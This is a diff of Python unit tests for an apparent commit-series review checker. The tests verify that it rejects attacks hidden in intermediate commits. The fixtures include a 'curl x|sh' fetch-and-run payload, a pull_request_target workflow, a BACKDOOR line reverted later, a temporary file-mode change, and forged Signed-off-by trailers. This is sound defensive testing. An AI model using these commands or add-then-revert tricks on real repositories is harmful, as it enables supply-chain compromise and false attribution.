@@ -19,6 +19,7 @@ from tests.test_commit_rules import RULES
 from tests.test_dossier_gate import dossier
 
 SECTIONS = ["Summary", "Testing"]
+APP_SIGNOFF = "Signed-off-by: " + commit_rules.APP_IDENTITY
 BODY = "## Summary\n\nAdd riscv64.\n\n## Testing\n\n- [x] CI"
 
 
@@ -91,8 +92,8 @@ class TestCheck(unittest.TestCase):
                                 workdir=self.root / f"check-{self.checks}")
 
     def test_a_passing_review(self):
-        mbox = self.series("ci: Build riscv64 wheels\n\nBody.\n\nSigned-off-by: a <a@b.c>",
-                           "ci: Test riscv64 wheels\n\nBody.\n\nSigned-off-by: a <a@b.c>")
+        mbox = self.series("ci: Build riscv64 wheels\n\nBody.\n\n" + APP_SIGNOFF,
+                           "ci: Test riscv64 wheels\n\nBody.\n\n" + APP_SIGNOFF)
         out = self.check(mbox, self.task(commit_rules=dict(RULES, max_commits=None),
                                          template_sections=SECTIONS))
         self.assertEqual((out["verdict"], out["reasons"]), ("pass", []))
@@ -104,6 +105,80 @@ class TestCheck(unittest.TestCase):
         again = self.check(mbox, self.task(commit_rules=dict(RULES, max_commits=None),
                                            template_sections=SECTIONS))
         self.assertEqual(again["head"], out["head"])
+
+    def intermediate(self, *steps):
+        """A reviewed series: the non-debug commits cherry-picked on the
+        base, then ``steps`` of (files, removed, message)."""
+        self.runs += 1
+        repo = self.root / f"evil-{self.runs}"
+        git(self.root, "clone", "-q", str(self.root / "riseproject-upstreaming/proj.git"), str(repo))
+        git(repo, "checkout", "-q", "-B", "review", self.base)
+        picks = [s for s in git(repo, "rev-list", "--reverse", f"{self.base}..origin/riscv64-dev").split()
+                 if not git(repo, "log", "-1", "--format=%s", s).startswith("{debug}")]
+        for sha in picks:
+            git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "cherry-pick", sha)
+        for files, removed, message in steps:
+            if removed:
+                git(repo, "rm", "-q", *removed)
+            commit_files(repo, files, msg=message)
+        return git(repo, "format-patch", "--stdout", self.base).encode() + b"\n"
+
+    def test_an_intermediate_commit_is_validated_like_the_head(self):
+        """The reproduced exploit: an out-of-scope workflow with
+        `pull_request_target`, an executable payload, and a backdoor in a
+        scope file are added and reverted again, so the head has the
+        approved tree."""
+        mbox = self.intermediate(
+            ({".github/workflows/x.yml": "on: pull_request_target\njobs: {}\n",
+              "evil.py": "import os; os.system('curl x|sh')\n", "setup.py": "c\nBACKDOOR\n"},
+             (), "Tidy"),
+            ({"setup.py": "c\n"}, (".github/workflows/x.yml", "evil.py"), "Tidy more"))
+        out = self.check(mbox)
+        reasons = "\n".join(out["reasons"])
+        self.assertEqual(out["verdict"], "fail")
+        self.assertEqual(out["tree"] if "tree" in out else out["clean_tree"], out["clean_tree"])
+        self.assertIn(".github/workflows/x.yml: outside the approved patch surface", reasons)
+        self.assertIn("introduces", reasons)
+        self.assertIn("touches .github/workflows/x.yml, evil.py", reasons)
+        self.assertIn("content in setup.py that no commit of the approved series has", reasons)
+
+    def test_a_backdoor_in_scope_reverted_later_is_refused(self):
+        mbox = self.intermediate(({"setup.py": "c\nBACKDOOR\n"}, (), "Tidy"),
+                                 ({"setup.py": "c\n"}, (), "Tidy more"))
+        out = self.check(mbox)
+        self.assertEqual(out["verdict"], "fail")
+        self.assertTrue(any("content in setup.py" in r for r in out["reasons"]), out["reasons"])
+
+    def test_a_symlink_or_a_new_mode_in_an_intermediate_commit_is_refused(self):
+        self.runs += 1
+        repo = self.root / f"mode-{self.runs}"
+        git(self.root, "clone", "-q", str(self.root / "riseproject-upstreaming/proj.git"), str(repo))
+        git(repo, "checkout", "-q", "-B", "review", self.base)
+        picks = [s for s in git(repo, "rev-list", "--reverse", f"{self.base}..origin/riscv64-dev").split()
+                 if not git(repo, "log", "-1", "--format=%s", s).startswith("{debug}")]
+        for sha in picks:
+            git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "cherry-pick", sha)
+        (repo / "setup.py").chmod(0o755)
+        git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-am", "Mode")
+        (repo / "setup.py").chmod(0o644)
+        git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-am", "Mode back")
+        mbox = git(repo, "format-patch", "--stdout", self.base).encode() + b"\n"
+        out = self.check(mbox)
+        self.assertEqual(out["verdict"], "fail")
+        self.assertTrue(any("executable file mode" in r for r in out["reasons"]), out["reasons"])
+
+    def test_attribution_trailers_are_the_app_or_those_of_the_approved_commits(self):
+        for trailer in ("Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
+                        "Co-authored-by: Real Maintainer <m@example.org>", "Reviewed-by: x <x@y.z>",
+                        "Acked-by: x", "Tested-by: x", "Reported-by: x", "Suggested-by: x",
+                        "Helped-by: x"):
+            with self.subTest(trailer=trailer):
+                mbox = self.series("Build riscv64 wheels\n\n" + trailer,
+                                   "Test riscv64 wheels\n\n" + APP_SIGNOFF)
+                out = self.check(mbox)
+                self.assertEqual(out["verdict"], "fail")
+                self.assertTrue(any("attribution trailer" in r for r in out["reasons"]),
+                                out["reasons"])
 
     def test_a_failed_review_keeps_its_reasons(self):
         out = self.check(b"", verdict="fail", reasons=["A CHANGELOG entry is missing"],
